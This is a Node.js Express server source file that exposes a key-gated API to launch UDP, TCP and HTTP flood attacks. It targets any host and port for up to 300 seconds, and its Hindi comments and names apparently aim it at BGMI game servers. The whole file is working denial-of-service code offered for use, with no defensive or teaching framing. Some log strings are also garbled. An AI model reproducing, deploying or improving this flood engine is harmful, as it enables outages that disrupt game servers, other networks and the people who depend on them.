const express = require('express');
const net = require('net');
const dgram = require('dgram');
const http = require('http');

const app = express();

const API_KEY = "BGMI-KILLER-300S-UDP-TCP-ALL-2026-SHADOW";  // ← Apna strong key daal yahan

app.get('/api/v1/attack', (req, res) => {
    const { key, host, port = "17870", time = "300", method = "ALL" } = req.query;

    if (key !== API_KEY) return res.send("INVALID KEY");

    const duration = Math.min(parseInt(time) || 300, 300);
    const targetPort = parseInt(port) || 17870;

    console.log(`[BGMI KILLER] \( {host}: \){targetPort} | ${duration}s | Method: ${method}`);

    startFullAttack(host, targetPort, duration, method.toUpperCase());

    res.send("SUCCESS → ATTACK STARTED ON ALL METHODS");
});

// ==================== FULL POWER ATTACK ENGINE ====================
function startFullAttack(target, port, duration, method) {
    const endTime = Date.now() + duration * 1000;

    // === UDP FLOOD (BGMI ke liye sabse powerful) ===
    if (method === "UDP" || method === "ALL") {
        const udp = dgram.createSocket('udp4');
        const payload = Buffer.alloc(2048, 'BGMI_KILL');  // Bigger payload

        const udpInterval = setInterval(() => {
            if (Date.now() > endTime) {
                clearInterval(udpInterval);
                udp.close();
                return;
            }
            for (let i = 0; i < 100; i++) {   // High packet rate
                udp.send(payload, 0, payload.length, port, target);
            }
        }, 5);
    }

    // === TCP FLOOD ===
    if (method === "TCP" || method === "ALL") {
        const tcpInterval = setInterval(() => {
            if (Date.now() > endTime) return;
            for (let i = 0; i < 50; i++) {
                const socket = net.connect(port, target, () => {
                    socket.write(Buffer.alloc(4096, 'x'));  // Big data
                });
                socket.on('error', () => {});
                setTimeout(() => socket.destroy(), 800);
            }
        }, 20);
    }

    // === HTTP FLOOD (Backup + Game Server) ===
    if (method === "HTTP" || method === "ALL") {
        const httpInterval = setInterval(() => {
            if (Date.now() > endTime) return;
            for (let i = 0; i < 150; i++) {
                const req = http.get(`http://\( {target}: \){port}`, () => {});
                req.on('error', () => {});
                req.setTimeout(1000);
            }
        }, 15);
    }
}

app.get('/status', (req, res) => {
    res.json({
        status: "LIVE",
        max_time: "300 seconds",
        methods: "UDP + TCP + HTTP + ALL",
        note: "All Ports Supported"
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 BGMI FULL POWER API RUNNING ON PORT ${PORT}`);
    console.log(`Max Attack Time: 300 seconds`);
});